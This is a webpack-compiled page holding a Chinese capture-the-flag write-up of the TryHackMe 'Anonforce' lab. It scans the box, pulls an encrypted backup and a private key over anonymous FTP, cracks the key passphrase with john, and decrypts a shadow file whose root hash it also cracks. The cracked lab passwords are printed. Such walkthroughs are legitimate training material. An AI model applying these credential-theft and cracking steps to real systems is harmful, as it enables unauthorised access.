"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[6072],{67390:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>d,contentTitle:()=>a,default:()=>p,frontMatter:()=>s,metadata:()=>i,toc:()=>c});var t=r(74848),o=r(28453);const s={sidebar_position:49,tags:["Easy","Linux","\u533f\u540d\u8eab\u4efd\u767b\u9646-FTP","\u5bc6\u7801\u7834\u89e3-\u54c8\u5e0c"],title:"Anonforce",description:"Anonforce",sidebar_label:"Anonforce",slug:"/tryhackme/49"},a="Anonforce",i={id:"box/TryHackMe/49",title:"Anonforce",description:"Anonforce",source:"@site/docs/box/TryHackMe/49.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/49",permalink:"/docs/tryhackme/49",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u533f\u540d\u8eab\u4efd\u767b\u9646-FTP",permalink:"/docs/tags/\u533f\u540d\u8eab\u4efd\u767b\u9646-ftp"},{label:"\u5bc6\u7801\u7834\u89e3-\u54c8\u5e0c",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3-\u54c8\u5e0c"}],version:"current",sidebarPosition:49,frontMatter:{sidebar_position:49,tags:["Easy","Linux","\u533f\u540d\u8eab\u4efd\u767b\u9646-FTP","\u5bc6\u7801\u7834\u89e3-\u54c8\u5e0c"],title:"Anonforce",description:"Anonforce",sidebar_label:"Anonforce",slug:"/tryhackme/49"},sidebar:"boxSidebar",previous:{title:"IDE",permalink:"/docs/tryhackme/48"},next:{title:"VulnNet: Roasted",permalink:"/docs/tryhackme/50"}},d={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"21 - FTP",id:"21---ftp",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"root",id:"root",level:3}];function l(n){const e={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,o.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h1,{id:"anonforce",children:"Anonforce"}),"\n",(0,t.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-135-46:~/bsidesgtanonforce# nmap -sTCV -p 21,22 --min-rate 1000 10.10.12.250\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-30 13:12 BST\nNmap scan report for ip-10-10-12-250.eu-west-1.compute.internal (10.10.12.250)\nHost is up (0.00015s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin\n| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot\n| drwxr-xr-x   17 0        0            3700 Aug 30 04:52 dev\n| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc\n| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home\n| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic\n| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic\n| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib\n| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64\n| drwx------    2 0        0           16384 Aug 11  2019 lost+found\n| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media\n| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt\n| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]\n| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt\n| dr-xr-xr-x   98 0        0               0 Aug 30 04:52 proc\n| drwx------    3 0        0            4096 Aug 11  2019 root\n| drwxr-xr-x   18 0        0             540 Aug 30 04:52 run\n| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin\n| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv\n| dr-xr-xr-x   13 0        0               0 Aug 30 04:52 sys\n|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:10.10.135.46\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)\n|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)\n|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (EdDSA)\nMAC Address: 02:B0:43:67:2A:C7 (Unknown)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1.27 seconds\n"})}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"\u6839\u636e FTP \u7684\u5185\u5bb9\u53ef\u4ee5\u5224\u65ad\u662f\u5c06\u6574\u4e2a\u76ee\u5f55\u90fd\u5171\u4eab\u4e86"}),"\n"]}),"\n",(0,t.jsx)(e.h2,{id:"21---ftp",children:"21 - FTP"}),"\n",(0,t.jsx)(e.p,{children:"\u8fdb\u884c\u904d\u5386\u6211\u53d1\u73b0\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u6587\u4ef6\u5939, \u5176\u4e2d\u662f\u4e00\u4e9b\u52a0\u5bc6\u7684\u5185\u5bb9"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"ftp> ls -al\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x   23 0        0            4096 Aug 11  2019 .\ndrwxr-xr-x   23 0        0            4096 Aug 11  2019 ..\ndrwxr-xr-x    2 0        0            4096 Aug 11  2019 bin\ndrwxr-xr-x    3 0        0            4096 Aug 11  2019 boot\ndrwxr-xr-x   17 0        0            3700 Aug 30 04:52 dev\ndrwxr-xr-x   85 0        0            4096 Aug 13  2019 etc\ndrwxr-xr-x    3 0        0            4096 Aug 11  2019 home\nlrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic\nlrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic\ndrwxr-xr-x   19 0        0            4096 Aug 11  2019 lib\ndrwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64\ndrwx------    2 0        0           16384 Aug 11  2019 lost+found\ndrwxr-xr-x    4 0        0            4096 Aug 11  2019 media\ndrwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt\ndrwxrwxrwx    2 1000     1000         4096 Aug 11  2019 **notread**\ndrwxr-xr-x    2 0        0            4096 Aug 11  2019 opt\ndr-xr-xr-x   92 0        0               0 Aug 30 04:52 proc\ndrwx------    3 0        0            4096 Aug 11  2019 root\ndrwxr-xr-x   18 0        0             540 Aug 30 04:52 run\ndrwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin\ndrwxr-xr-x    3 0        0            4096 Aug 11  2019 srv\ndr-xr-xr-x   13 0        0               0 Aug 30 04:52 sys\ndrwxrwxrwt    9 0        0            4096 Aug 30 04:52 tmp\ndrwxr-xr-x   10 0        0            4096 Aug 11  2019 usr\ndrwxr-xr-x   11 0        0            4096 Aug 11  2019 var\nlrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic\nlrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic\n226 Directory send OK.\nftp> cd notread\n250 Directory successfully changed.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp\n-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5c06\u4e0a\u9762\u7684\u4e24\u4e2a\u6587\u4ef6\u4e0b\u8f7d, \u5e76\u89e3\u5bc6"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:'root@ip-10-10-135-46:~/bsidesgtanonforce# gpg2john private.asc > hash.txt\n\nFile private.asc\nroot@ip-10-10-135-46:~/bsidesgtanonforce# john hash.txt --wordlist=`locate rockyou.txt`\nWarning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"\nUse the "--format=gpg-opencl" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])\nCost 1 (s2k-count) is 65536 for all loaded hashes\nCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes\nCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\nxbox360          (anonforce)\n1g 0:00:00:00 DONE (2023-08-30 13:18) 10.00g/s 9300p/s 9300c/s 9300C/s xbox360..sheena\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed. \nroot@ip-10-10-135-46:~/bsidesgtanonforce# gpg --import private.asc\ngpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed\ngpg: key B92CD1F280AD82C2: secret key imported\ngpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed\ngpg: Total number processed: 2\ngpg:              unchanged: 2\ngpg:       secret keys read: 1\ngpg:   secret keys imported: 1\nroot@ip-10-10-135-46:~/bsidesgtanonforce# gpg --decrypt --output decrypted_backup --recipient "[ unknown] anonforce <melodias@anonforce.nsa>" backup.pgp \ngpg: WARNING: cypher algorithm CAST5 not found in recipient preferences\ngpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12\n      "anonforce <melodias@anonforce.nsa>"\nFile \'decrypted_backup\' exists. Overwrite? (y/N) y\nroot@ip-10-10-135-46:~/bsidesgtanonforce# ls\nbackup.pgp  decrypted_backup  hash.txt  private.asc\nroot@ip-10-10-135-46:~/bsidesgtanonforce# cd decrypted_backup \nbash: cd: decrypted_backup: Not a directory\nroot@ip-10-10-135-46:~/bsidesgtanonforce# cat decrypted_backup \nroot:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::\ndaemon:*:17953:0:99999:7:::\nbin:*:17953:0:99999:7:::\nsys:*:17953:0:99999:7:::\nsync:*:17953:0:99999:7:::\ngames:*:17953:0:99999:7:::\nman:*:17953:0:99999:7:::\nlp:*:17953:0:99999:7:::\nmail:*:17953:0:99999:7:::\nnews:*:17953:0:99999:7:::\nuucp:*:17953:0:99999:7:::\nproxy:*:17953:0:99999:7:::\nwww-data:*:17953:0:99999:7:::\nbackup:*:17953:0:99999:7:::\nlist:*:17953:0:99999:7:::\nirc:*:17953:0:99999:7:::\ngnats:*:17953:0:99999:7:::\nnobody:*:17953:0:99999:7:::\nsystemd-timesync:*:17953:0:99999:7:::\nsystemd-network:*:17953:0:99999:7:::\nsystemd-resolve:*:17953:0:99999:7:::\nsystemd-bus-proxy:*:17953:0:99999:7:::\nsyslog:*:17953:0:99999:7:::\n_apt:*:17953:0:99999:7:::\nmessagebus:*:18120:0:99999:7:::\nuuidd:*:18120:0:99999:7:::\nmelodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::\nsshd:*:18120:0:99999:7:::\nftp:*:18120:0:99999:7:::\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u5c1d\u8bd5\u89e3\u5bc6"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:'root@ip-10-10-135-46:~/bsidesgtanonforce# john hash.txt --wordlist=`locate rockyou.txt`\nWarning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"\nUse the "--format=sha512crypt-opencl" option to force loading these as that type instead\nWarning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"\nUse the "--format=md5crypt" option to force loading hashes of that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\nhikari           (root)\n1g 0:00:00:12 DONE (2023-08-30 13:26) 0.07961g/s 550.3p/s 550.3c/s 550.3C/s 111111111111111..bethan\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed.\n'})}),"\n",(0,t.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(e.h3,{id:"root",children:"root"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240630231410.png",alt:"20240630231410"})})]})}function p(n={}){const{wrapper:e}={...(0,o.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(l,{...n})}):l(n)}},28453:(n,e,r)=>{r.d(e,{R:()=>a,x:()=>i});var t=r(96540);const o={},s=t.createContext(o);function a(n){const e=t.useContext(s);return t.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function i(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(o):n.components||o:a(n.components),t.createElement(s.Provider,{value:e},n.children)}}}]);